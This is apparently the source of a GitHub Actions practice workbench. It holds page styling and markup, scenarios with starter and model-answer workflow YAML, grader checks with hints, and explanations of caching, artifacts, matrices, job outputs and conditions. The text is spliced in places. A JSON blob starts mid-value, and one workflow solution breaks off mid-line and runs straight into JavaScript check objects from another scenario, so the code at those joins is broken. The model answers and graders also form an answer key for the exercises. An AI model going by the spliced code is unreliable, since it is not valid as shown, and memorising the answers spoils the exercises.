/* Layout: workbench. Scenario sheet on top; editor (left) and analysis tabs (right) below; stacks on narrow screens. Same type and color system as the UKG Staff Prep Guide. */
:root {
  --bg: #eef1f3; --surface: #ffffff; --sunk: #e3e8ec; --ink: #142028; --muted: #55636d; --line: #cbd3d9;
  --accent: #b4520c; --accent-soft: #fbeee2; --link: #0d5c8c; --ok: #1e7a46; --ok-soft: #e2f3e8;
  --err: #c0362c; --err-soft: #fbe6e3; --warn: #9a6200; --warn-soft: #fbf0d8; --mark: #fff1a8;
  --code-bg: #f8fafb; --cm-key: #0d5c8c; --cm-str: #1e7a46; --cm-com: #7b8790; --cm-num: #9c5b14; --cm-meta: #b4520c; --cm-sel: #d9e6f2; --cm-active: #f1f5f8;
  --f-display: "Barlow Condensed", "Arial Narrow", "Roboto Condensed", sans-serif;
  --f-body: "Source Sans 3", "Segoe UI", system-ui, -apple-system, sans-serif;
  --f-mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg: #0d1317; --surface: #141c22; --sunk: #1b252c; --ink: #e3e9ed; --muted: #94a3ad; --line: #283640;
    --accent: #f08a3c; --accent-soft: #2e1f13; --link: #6cb8ea; --ok: #5cc98a; --ok-soft: #12291c;
    --err: #f2786d; --err-soft: #2f1715; --warn: #e8b04a; --warn-soft: #2c2312; --mark: #5a4b12;
    --code-bg: #10171c; --cm-key: #7cc3f0; --cm-str: #8fd6a6; --cm-com: #6f7d87; --cm-num: #e3a35d; --cm-meta: #f08a3c; --cm-sel: #23384a; --cm-active: #162027;
    color-scheme: dark;
  }
}
:root[data-theme="dark"] {
  --bg: #0d1317; --surface: #141c22; --sunk: #1b252c; --ink: #e3e9ed; --muted: #94a3ad; --line: #283640;
  --accent: #f08a3c; --accent-soft: #2e1f13; --link: #6cb8ea; --ok: #5cc98a; --ok-soft: #12291c;
  --err: #f2786d; --err-soft: #2f1715; --warn: #e8b04a; --warn-soft: #2c2312; --mark: #5a4b12;
  --code-bg: #10171c; --cm-key: #7cc3f0; --cm-str: #8fd6a6; --cm-com: #6f7d87; --cm-num: #e3a35d; --cm-meta: #f08a3c; --cm-sel: #23384a; --cm-active: #162027;
  color-scheme: dark;
}
* { box-sizing: border-box; }
body { background: var(--bg); color: var(--ink); font-family: var(--f-body); font-size: 16px; line-height: 1.55; margin: 0; }
a { color: var(--link); text-underline-offset: 2px; }
code { font-family: var(--f-mono); font-size: .86em; background: var(--sunk); padding: .05em .3em; border-radius: 3px; overflow-wrap: anywhere; }
h1, h2, h3, h4 { margin: 0; line-height: 1.2; text-wrap: balance; }
p { margin: 0; }
button:focus-visible, select:focus-visible, a:focus-visible, [role=tab]:focus-visible { outline: 2px solid var(--link); outline-offset: 2px; }
.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }

/* top bar */
.top { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 20; background: var(--surface); border-bottom: 1px solid var(--line); }
.topin { max-width: 1440px; margin: 0 auto; padding: .5rem 16px; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
.back { font-family: var(--f-display); font-weight: 600; letter-spacing: .03em; color: var(--muted); text-decoration: none; white-space: nowrap; }
.back:hover { color: var(--link); }
.brand { font-family: var(--f-display); font-weight: 700; font-size: 1.25rem; letter-spacing: .04em; margin-right: auto; }
.brand span { color: var(--accent); }
.progress { font-family: var(--f-display); font-weight: 600; color: var(--muted); font-variant-numeric: tabular-nums; }

.wb { max-width: 1440px; margin: 0 auto; padding: 1rem 16px 3rem; display: flex; flex-direction: column; gap: 1rem; }

/* scenario */
.scbar { display: flex; gap: .5rem; flex-wrap: wrap; align-items: center; }
.scbar label { font-family: var(--f-display); font-weight: 600; letter-spacing: .06em; text-transform: uppercase; font-size: .85rem; color: var(--muted); }
#pick { font: inherit; font-size: .95rem; padding: .35rem .5rem; border: 1px solid var(--line); background: var(--surface); color: var(--ink); border-radius: 4px; min-width: 0; flex: 1 1 260px; max-width: 460px; }
.btn { font: inherit; font-size: .92rem; font-weight: 600; padding: .38rem .8rem; border-radius: 4px; border: 1px solid var(--ink); background: var(--ink); color: var(--surface); cursor: pointer; white-space: nowrap; }
.btn:hover { filter: brightness(1.15); }
.btn.ghost { background: var(--surface); color: var(--ink); border-color: var(--line); }
.btn.ghost:hover { border-color: var(--link); color: var(--link); filter: none; }
.btn.small { font-size: .82rem; padding: .25rem .6rem; }
.btn:disabled { opacity: .4; cursor: default; filter: none; }
.sccard { background: var(--surface); border: 1px solid var(--line); border-left: 6px solid var(--accent); padding: 1rem 1.25rem; display: grid; grid-template-columns: minmax(0, 1.3fr) minmax(0, 1fr); gap: .6rem 2rem; position: relative; }
.scmain { display: flex; flex-direction: column; gap: .5rem; min-width: 0; }
.meta { display: flex; gap: .4rem; flex-wrap: wrap; }
.chip { font-family: var(--f-mono); font-size: .72rem; letter-spacing: .04em; text-transform: uppercase; padding: .1rem .45rem; border: 1px solid var(--line); color: var(--muted); }
.chip.lv1 { border-color: var(--ok); color: var(--ok); } .chip.lv2 { border-color: var(--link); color: var(--link); } .chip.lv3 { border-color: var(--accent); color: var(--accent); }
#sc-title { font-family: var(--f-display); font-weight: 700; font-size: clamp(1.6rem, 3.2vw, 2.2rem); letter-spacing: .005em; }
#sc-story { font-size: 1.04rem; max-width: 68ch; }
.tasks { min-width: 0; border-left: 1px dashed var(--line); padding-left: 1.25rem; display: flex; flex-direction: column; gap: .35rem; }
.tasks h2 { font-family: var(--f-display); font-weight: 600; font-size: .95rem; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
#sc-tasks { margin: 0; padding-left: 1.2rem; display: flex; flex-direction: column; gap: .25rem; }
#sc-tasks li::marker { font-family: var(--f-mono); color: var(--accent); }
.docs { font-size: .9rem; }
.solved { position: absolute; top: .8rem; right: 1rem; font-family: var(--f-display); font-weight: 700; letter-spacing: .08em; text-transform: uppercase; font-size: .85rem; color: var(--ok); border: 2px solid var(--ok); padding: .05rem .5rem; transform: rotate(-3deg); background: var(--surface); }

/* work area */
.work { display: grid; grid-template-columns: minmax(0, 1.25fr) minmax(0, 1fr); gap: 1rem; align-items: start; }
.edcol { min-width: 0; display: flex; flex-direction: column; border: 1px solid var(--line); background: var(--surface); }
.edbar { display: flex; align-items: center; gap: .5rem; flex-wrap: wrap; padding: .45rem .6rem; border-bottom: 1px solid var(--line); background: var(--sunk); }
.fname { font-family: var(--f-mono); font-size: .8rem; color: var(--muted); margin-right: auto; }
.status { display: flex; gap: .35rem; flex-wrap: wrap; padding: .4rem .6rem; border-top: 1px solid var(--line); font-size: .8rem; align-items: center; }
.status .kbd { margin-left: auto; color: var(--muted); font-size: .78rem; }
.pill { font-family: var(--f-mono); font-size: .72rem; padding: .05rem .45rem; border-radius: 10px; border: 1px solid var(--line); color: var(--muted); }
.pill.err { border-color: var(--err); color: var(--err); background: var(--err-soft); }
.pill.warn { border-color: var(--warn); color: var(--warn); background: var(--warn-soft); }
.pill.ok { border-color: var(--ok); color: var(--ok); background: var(--ok-soft); }
#editor { min-width: 0; }
#editor .CodeMirror { height: min(64vh, 640px); min-height: 340px; font-family: var(--f-mono); font-size: 13.5px; line-height: 1.6; background: var(--code-bg); color: var(--ink); }
.nocm { padding: 1rem; color: var(--err); }

/* side panel */
.side { min-width: 0; border: 1px solid var(--line); background: var(--surface); display: flex; flex-direction: column; }
#tabs { display: flex; border-bottom: 1px solid var(--line); background: var(--sunk); overflow-x: auto; }
[role=tab] { font: inherit; font-family: var(--f-display); font-weight: 600; font-size: .98rem; letter-spacing: .03em; padding: .55rem .8rem; border: 0; border-bottom: 3px solid transparent; background: none; color: var(--muted); cursor: pointer; white-space: nowrap; display: inline-flex; gap: .35rem; align-items: center; }
[role=tab][aria-selected=true] { color: var(--ink); border-bottom-color: var(--accent); background: var(--surface); }
.badge { font-family: var(--f-mono); font-size: .7rem; min-width: 1.2rem; text-align: center; padding: 0 .3rem; border-radius: 8px; background: var(--line); color: var(--ink); }
.badge:empty { display: none; }
.badge.err { background: var(--err); color: var(--surface); } .badge.warn { background: var(--warn); color: var(--surface); } .badge.ok { background: var(--ok); color: var(--surface); }
.panel { padding: .9rem 1rem; max-height: min(64vh, 640px); min-height: 340px; overflow-y: auto; display: flex; flex-direction: column; gap: .75rem; }
.empty { color: var(--muted); font-size: .95rem; }

.plist { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: .55rem; }
.plist li { border-left: 3px solid var(--line); padding: .35rem .6rem; background: var(--bg); display: flex; flex-direction: column; gap: .15rem; }
.plist li.sev-error { border-left-color: var(--err); } .plist li.sev-warning { border-left-color: var(--warn); }
.pjump { font: inherit; background: none; border: 0; padding: 0; display: flex; gap: .5rem; align-items: baseline; cursor: pointer; color: inherit; text-align: left; }
.sev { font-family: var(--f-display); font-weight: 700; font-size: .78rem; letter-spacing: .08em; text-transform: uppercase; }
.sev-error .sev { color: var(--err); } .sev-warning .sev { color: var(--warn); } .sev-info .sev { color: var(--muted); }
.ln { font-family: var(--f-mono); font-size: .75rem; color: var(--link); text-decoration: underline; text-underline-offset: 2px; }
.pmsg { font-weight: 600; font-size: .95rem; }
.pwhy { font-size: .9rem; color: var(--muted); }

.score { font-size: 1rem; }
.clist { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: .4rem; }
.clist li { display: grid; grid-template-columns: 1.6rem minmax(0, 1fr); gap: .1rem .4rem; padding: .4rem .5rem; border: 1px solid var(--line); background: var(--bg); }
.clist .mark { grid-row: 1 / span 2; font-weight: 700; width: 1.35rem; height: 1.35rem; display: inline-flex; align-items: center; justify-content: center; border-radius: 50%; font-size: .8rem; }
.clist .pass .mark { background: var(--ok); color: var(--surface); } .clist .fail .mark { background: var(--err-soft); color: var(--err); border: 1px solid var(--err); }
.clist .pass .clabel { color: var(--muted); }
.chint { grid-column: 2; font-size: .9rem; background: var(--mark); color: var(--ink); padding: .25rem .45rem; }

.xsec { display: flex; flex-direction: column; gap: .25rem; }
.xsec h4 { font-family: var(--f-display); font-weight: 600; font-size: 1.05rem; letter-spacing: .03em; }
.xjob h4 { font-family: var(--f-mono); font-size: .9rem; font-weight: 600; color: var(--accent); }
.xsec ul { margin: 0; padding-left: 1.1rem; display: flex; flex-direction: column; gap: .2rem; font-size: .95rem; }

.xplain { border-left: 4px solid var(--ok); background: var(--ok-soft); padding: .5rem .7rem; }
.ansbar { display: flex; gap: .6rem; flex-wrap: wrap; align-items: center; }
.note { font-size: .82rem; color: var(--muted); }
.anscode { margin: 0; background: var(--code-bg); border: 1px solid var(--line); padding: .7rem .8rem; overflow-x: auto; font-family: var(--f-mono); font-size: .82rem; line-height: 1.55; }
.anscode code { background: none; padding: 0; white-space: pre; overflow-wrap: normal; }

.toast { position: fixed; left: 50%; transform: translateX(-50%); bottom: calc(18px + env(safe-area-inset-bottom, 0px)); z-index: 50; background: var(--ink); color: var(--surface); padding: .6rem .9rem; display: flex; gap: .8rem; align-items: center; box-shadow: 0 6px 20px rgba(0,0,0,.25); max-width: calc(100% - 32px); font-weight: 600; }
.toast .btn { background: var(--surface); color: var(--ink); border-color: var(--surface); }

/* CodeMirror theme from tokens */
.cm-s-default .cm-atom { color: var(--cm-key); font-weight: 600; }
.cm-s-default .cm-string { color: var(--cm-str); }
.cm-s-default .cm-comment { color: var(--cm-com); font-style: italic; }
.cm-s-default .cm-number { color: var(--cm-num); }
.cm-s-default .cm-meta, .cm-s-default .cm-keyword { color: var(--cm-meta); }
.cm-s-default .cm-def, .cm-s-default .cm-variable-2 { color: var(--accent); }
.CodeMirror-gutters { background: var(--sunk) !important; border-right: 1px solid var(--line) !important; }
.CodeMirror-linenumber { color: var(--muted) !important; }
.CodeMirror-cursor { border-left-color: var(--ink) !important; }
.CodeMirror-selected, .CodeMirror-focused .CodeMirror-selected { background: var(--cm-sel) !important; }
.CodeMirror-activeline-background { background: var(--cm-active) !important; }
.CodeMirror-lint-tooltip { font-family: var(--f-body) !important; font-size: .88rem !important; background: var(--surface) !important; color: var(--ink) !important; border: 1px solid var(--line) !important; max-width: 420px; white-space: pre-wrap !important; box-shadow: 0 4px 14px rgba(0,0,0,.18); }
.CodeMirror-lint-mark-error { background: none !important; border-bottom: 2px wavy var(--err); }
.CodeMirror-lint-mark-warning { background: none !important; border-bottom: 2px wavy var(--warn); }
.CodeMirror-lint-mark-info { background: none !important; border-bottom: 1px dotted var(--muted); }

@media (max-width: 1100px) {
  .work { grid-template-columns: minmax(0, 1fr); }
  .panel { max-height: none; min-height: 200px; }
}
@media (max-width: 720px) {
  .sccard { grid-template-columns: minmax(0, 1fr); padding: .9rem; }
  .tasks { border-left: 0; border-top: 1px dashed var(--line); padding: .6rem 0 0; }
  #editor .CodeMirror { height: 52vh; min-height: 300px; font-size: 13px; }
  .status .kbd { display: none; }
  .solved { position: static; transform: none; justify-self: start; }
  #pick { flex-basis: 100%; max-width: none; }
}
@media (prefers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } }
[hidden] { display: none !important; }

#explain, #problems, #checks, #answer { display: flex; flex-direction: column; gap: .9rem; }
@media (max-width: 560px) {
  .topin { gap: .2rem .8rem; padding-block: .4rem; }
  .back { font-size: .9rem; flex-basis: 100%; }
  .brand { font-size: 1.1rem; }
  .scbar label { display: none; }
  .scbar .btn { flex: 1 1 auto; }
}

[hidden]{display:none!important}</style>
</head>
<body>
<header class="top"><div class="topin">
<a class="back" href="./">&larr; UKG Prep Guide</a>
<span class="brand">Actions <span>Workbench</span></span>
<span class="progress" id="progress" aria-live="polite"></span>
</div></header>
<main class="wb">
<section class="scenario" aria-label="Scenario">
  <div class="scbar">
    <label for="pick">Scenario</label>
    <select id="pick"></select>
    <button type="button" class="btn ghost" id="prev">← Previous</button>
    <button type="button" class="btn ghost" id="next">Next →</button>
    <button type="button" class="btn ghost" id="random">Random unsolved</button>
  </div>
  <article class="sccard">
    <div class="scmain">
      <div class="meta" id="sc-meta"></div>
      <h1 id="sc-title"></h1>
      <p id="sc-story"></p>
      <a class="docs" id="sc-docs" href="#" target="_blank" rel="noopener">Read the GitHub docs for this topic ↗</a>
    </div>
    <div class="tasks"><h2>Your task</h2><ol id="sc-tasks"></ol></div>
    <span class="solved" id="solved" hidden>Solved</span>
  </article>
</section>
<section class="work">
  <div class="edcol">
    <div class="edbar">
      <span class="fname">.github/workflows/workflow.yml</span>
      <button type="button" class="btn" id="check">Check answer</button>
      <button type="button" class="btn ghost" id="hint">Hint</button>
      <button type="button" class="btn ghost" id="reset">Reset</button>
    </div>
    <div id="editor"></div>
    <div class="status"><span id="status"></span><span class="kbd">Tab indents 2 spaces · Ctrl/Cmd + Enter checks · Ctrl/Cmd + / comments</span></div>
  </div>
  <div class="side">
    <div role="tablist" id="tabs" aria-label="Analysis">
      <button role="tab" id="tab-problems" data-tab="problems" aria-controls="panel-problems" aria-selected="true">Problems <span class="badge"></span></button>
      <button role="tab" id="tab-checks" data-tab="checks" aria-controls="panel-checks" aria-selected="false" tabindex="-1">Requirements <span class="badge"></span></button>
      <button role="tab" id="tab-explain" data-tab="explain" aria-controls="panel-explain" aria-selected="false" tabindex="-1">What it does</button>
      <button role="tab" id="tab-answer" data-tab="answer" aria-controls="panel-answer" aria-selected="false" tabindex="-1">Model answer</button>
    </div>
    <div class="panel" role="tabpanel" id="panel-problems" aria-labelledby="tab-problems"><div id="problems"></div></div>
    <div class="panel" role="tabpanel" id="panel-checks" aria-labelledby="tab-checks" hidden><div id="checks"></div></div>
    <div class="panel" role="tabpanel" id="panel-explain" aria-labelledby="tab-explain" hidden><div id="explain"></div></div>
    <div class="panel" role="tabpanel" id="panel-answer" aria-labelledby="tab-answer" hidden><div id="answer"></div></div>
  </div>
</section>
</main>
<div class="toast" id="toast" role="status" hidden></div>

        TARGET: ${{ inputs.environment }}\n          DRY_RUN: ${{ inputs.dry_run }}\n        run: |\n          echo \"Deploying to $TARGET (dry run: $DRY_RUN)\"\n"}, "nightly-utc": {"starter": "name: Nightly E2E\non:\n  schedule:\n    - cron: \"30 2 * * 1-5\"\npermissions:\n  contents: read\njobs:\n  e2e:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npx playwright test\n", "solution": "name: Nightly E2E\non:\n  schedule:\n    - cron: \"0 21 * * 0-4\"   # 02:30 IST Mon-Fri = 21:00 UTC Sun-Thu\n  workflow_dispatch:\npermissions:\n  contents: read\njobs:\n  e2e:\n    runs-on: ubuntu-latest\n    timeout-minutes: 60\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npx playwright install --with-deps\n      - run: npx playwright test\n"}, "path-filters": {"starter": "name: Unit tests\non:\n  pull_request:\n    paths:\n      - \"src/**\"\n    paths-ignore:\n      - \"docs/**\"\npermissions:\n  contents: read\njobs:\n  unit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm test\n", "solution": "name: Unit tests\non:\n  pull_request:\n    paths:\n      - \"src/**\"\n      - \"package.json\"\n      - \"package-lock.json\"\n      - \"!src/**/*.md\"\npermissions:\n  contents: read\njobs:\n  unit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm test\n"}, "fan-out": {"starter": "name: PR checks\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run lint\n  unit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm test\n  e2e:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npx playwright test\n", "solution": "name: PR checks\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run lint\n  unit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm test\n  e2e:\n    needs: [lint, unit]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npx playwright test\n"}, "matrix": {"starter": "name: Compatibility\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm test\n", "solution": "name: Compatibility\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: [18, 20, 22]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n      - run: npm ci\n      - run: npm test\n"}, "cache": {"starter": "name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm test\n", "solution": "name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: npm\n      - name: Cache Playwright browsers\n        uses: actions/cache@v4\n        with:\n          path: ~/.cache/ms-playwright\n          key: playwright-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}\n      - run: npm ci\n      - run: npm test\n"}, "artifacts": {"starter": "name: Build and deploy\non:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v3\n        with:\n          path: dist\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v3\n      - run: ./scripts/deploy.sh dist\n", "solution": "name: Build and deploy\non:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist\n      - run: ./scripts/deploy.sh dist\n"}, "outputs": {"starter": "name: Release\non:\n  push:\n    tags: [\"v*\"]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo \"::set-output name=version::$(node -p \"require('./package.json').version\")\"\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Releasing version ...\"\n", "solution": "name: Release\non:\n  push:\n    tags: [\"v*\"]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - uses: actions/checkout@v4\n      - id: ver\n        run: echo \"version=$(node -p \"require('./package.json').version\")\" >> \"$GITHUB_OUTPUT\"\n  release:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      -         { label: 'Matrix has the two operating systems', test: function (h) { var m = ((h.job('test') || {}).strategy || {}).matrix || {}; return Object.keys(m).some(function (k) { return h.listHas(m[k], 'ubuntu-latest') && h.listHas(m[k], 'windows-latest'); }); }, hint: 'Add `os: [ubuntu-latest, windows-latest]` under `strategy.matrix`.' },
        { label: 'Matrix has Node 18, 20 and 22', test: function (h) { var m = ((h.job('test') || {}).strategy || {}).matrix || {}; return Object.keys(m).some(function (k) { return [18, 20, 22].every(function (v) { return h.listHas(m[k], v); }); }); }, hint: 'Add `node: [18, 20, 22]` under `strategy.matrix`.' },
        { label: 'runs-on uses the matrix', test: function (h) { return /matrix\./.test(h.str((h.job('test') || {})['runs-on'])); }, hint: 'Set `runs-on: ${{ matrix.os }}`.' },
        { label: 'node-version uses the matrix', test: function (h) { return !!h.findStep(function (s) { return h.uses(s, 'actions/setup-node') && isObj(s.with) && /matrix\./.test(h.str(s.with['node-version'])); }); }, hint: 'Set `node-version: ${{ matrix.node }}`.' },
        { label: 'fail-fast is off', test: function (h) { return ((h.job('test') || {}).strategy || {})['fail-fast'] === false; }, hint: 'Add `fail-fast: false` under `strategy`. By default, one failure cancels all other combinations.' },
      ],
      explain: 'A matrix makes one job copy for each combination: 2 × 3 = 6 jobs. `fail-fast: false` lets every combination finish, so you see all failures in one run. Use `include` to add one special combination and `exclude` to remove one.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow' },

    { id: 'cache', level: 2, topic: 'G2', title: 'Cache dependencies and browsers',
      story: 'Every run downloads all npm packages and the Playwright browsers again. Installation takes 4 minutes of a 9-minute run.',
      tasks: ['Cache npm downloads with `setup-node`.', 'Cache `~/.cache/ms-playwright` with `actions/cache`. The key must change when the lock file changes.'],
      checks: [
        { label: 'npm cache is on', test: function (h) { return !!h.findStep(function (s) { return (h.uses(s, 'actions/setup-node') && isObj(s.with) && s.with.cache === 'npm') || (h.uses(s, 'actions/cache') && isObj(s.with) && /\.npm/.test(h.str(s.with.path))); }); }, hint: 'Add `cache: npm` under the `with:` of `actions/setup-node`.' },
        { label: 'Playwright browsers are cached', test: function (h) { return !!h.findStep(function (s) { return h.uses(s, 'actions/cache', 4) && isObj(s.with) && /ms-playwright/.test(h.str(s.with.path)); }); }, hint: 'Add `actions/cache@v4` with `path: ~/.cache/ms-playwright`.' },
        { label: 'The cache key uses hashFiles of the lock file', test: function (h) { return !!h.findStep(function (s) { return h.uses(s, 'actions/cache') && isObj(s.with) && /hashFiles\(\s*'[^']*package-lock\.json'\s*\)/.test(h.str(s.with.key)); }); }, hint: 'Use `key: playwright-${{ runner.os }}-${{ hashFiles(\'**/package-lock.json\') }}`. A new lock file gives a new key.' },
        { label: 'Cache step comes before npm ci', test: function (h) { var st = h.steps(h.job('test')), c = -1, n = -1; st.forEach(function (s, i) { if (h.uses(s, 'actions/cache') && c < 0) c = i; if (/npm ci/.test(h.str(s.run)) && n < 0) n = i; }); return c >= 0 && n >= 0 && c < n; }, hint: 'A cache restores files only for the steps after it. Put the cache step before `npm ci`.' },
      ],
      explain: 'A cache key is an exact name. When the key matches, the cache restores. When the lock file changes, `hashFiles` makes a new key, so stale packages never come back. The runner OS is in the key because Linux and Windows binaries differ. Caches are scoped to the branch, with a fallback to the default branch.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows' },

    { id: 'artifacts', level: 2, topic: 'G6', title: 'Build once, pass the files',
      story: 'The deploy job fails. It uses old artifact actions and it starts at the same time as the build. Fix it so that deploy uses the exact files that build made.',
      tasks: ['Upload `dist` with `upload-artifact` v4 and name it `dist`.', 'Make `deploy` wait for `build`.', 'Download `dist` with `download-artifact` v4.'],
      checks: [
        { label: 'Upload uses v4 with name dist', test: function (h) { return !!h.findStep(function (s) { return h.uses(s, 'actions/upload-artifact', 4) && isObj(s.with) && s.with.name === 'dist'; }); }, hint: 'Use `actions/upload-artifact@v4` and add `name: dist`. v3 stopped working in January 2025.' },
        { label: 'deploy needs build', test: function (h) { return h.needs(h.job('deploy')).indexOf('build') !== -1; }, hint: 'Add `needs: build` to `deploy`. Without it, deploy starts before the artifact exists.' },
        { label: 'Download uses v4 with the same name', test: function (h) { return !!h.findStep(function (s, x) { return x.jid === 'deploy' && h.uses(s, 'actions/download-artifact', 4) && isObj(s.with) && s.with.name === 'dist'; }); }, hint: 'In `deploy`, use `actions/download-artifact@v4` with `name: dist`.' },
      ],
      explain: 'Each job runs on a new, empty runner, so files do not carry over. An artifact moves files from one job to another job in the same run. In v4, artifacts are immutable and names must be unique in the run. Deploy the files that the build job made; do not build again in the deploy job.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow' },

    { id: 'outputs', level: 2, topic: 'G6', title: 'Pass a value between steps and jobs',
      story: 'The build job reads the version from `package.json`. The release job needs that version. The current file uses a deprecated command, and the release job cannot see the value.',
      tasks: ['Give the version step an `id` and write the value to `$GITHUB_OUTPUT`.', 'Expose it as a job output `version`.', 'Make `release` need `build` and read the output.'],
      checks: [
        { label: 'No deprecated `::set-output`', test: function (h) { return !/::set-output/.test(h.text); }, hint: 'Use `echo "version=..." >> "$GITHUB_OUTPUT"` instead.' },
        { label: 'A step with an id writes to $GITHUB_OUTPUT', test: function (h) { return !!h.findStep(function (s) { return s.id && /GITHUB_OUTPUT/.test(h.str(s.run)); }); }, hint: 'Add `id: ver` to the step, and write `echo "version=$(...)" >> "$GITHUB_OUTPUT"`.' },
        { label: 'build has a job output from that step', test: function (h) { var o = (h.job('build') || {}).outputs; return isObj(o) && Object.keys(o).some(function (k) { return /steps\.[\w-]+\.outputs\./.test(h.str(o[k])); }); }, hint: 'Add `outputs:` to the build job: `version: ${{ steps.ver.outputs.version }}`.' },
        { label: 'release needs build and reads the output', test: function (h) { var r = h.job('release'); return !!r && h.needs(r).indexOf('build') !== -1 && /needs\.build\.outputs\./.test(h.allText(r)); }, hint: 'Add `needs: build`, then use `${{ needs.build.outputs.version }}`.' },
      ],
      explain: 'A step output lives in `$GITHUB_OUTPUT` and other steps in the same job read it as `steps.<id>.outputs.<name>`. To cross a job boundary, the job must map it in `outputs:`, and the next job reads it through `needs.<job>.outputs.<name>`. Outputs are strings, and secrets in outputs are masked or dropped.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs' },

    { id: 'conditions', level: 2, topic: 'L4', title: 'Run steps and jobs only when needed',
      story: 'The pipeline deploys from every branch and from pull requests. Log collection runs even when tests pass, and test data cleanup does not run when tests fail.',
      tasks: ['Run `deploy` only for a push to `main`.', 'Run the log collection step only when an earlier step failed.', 'Run the cleanup step always, even after a failure.'],
      checks: [
        { label: 'deploy runs only for a push to main', test: function (h) { var c = h.str((h.job('deploy') || {}).if); return /refs\/heads\/main/.test(c) && /event_name\s*==\s*'push'/.test(c); }, hint: 'Add `if: github.event_name == \'push\' && github.ref == \'refs/heads/main\'` to the deploy job.' },
        { label: 'Log collection runs only on failure', test: function (h) { return !!h.findStep(function (s) { return /collect-logs/.test(h.str(s.run)) && /failure\(\)/.test(h.str(s.if)); }); }, hint: 'Add `if: failure()` to the log step.' },
        { label: 'Cleanup always runs', test: function (h) { return !!h.findStep(function (s) { return /cleanup/.test(h.str(s.run)) && /always\(\)|!\s*cancelled\(\)/.test(h.str(s.if)); }); }, hint: 'Add `if: always()` to the cleanup step. Without a status function, a step runs only if all earlier steps passed.' },
      ],
      explain: 'Every `if:` has an invisible `success() &&` in front, unless you use a status function. `failure()` runs after an earlier failure. `always()` runs every time, even after cancel; `!cancelled()` skips a cancelled run. `github.ref` for a push to main is `refs/heads/main`, not `main`.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions#status-check-functions' },

    { id: 'reusable-define', level: 3, topic: 'G1', title: 'Write a reusable workflow',
      story: 'You own the shared E2E workflow for 300 repositories. Turn this file into a reusable workflow. Teams must choose the Node.js version and the test command. The workflow needs a private npm token from the caller.',
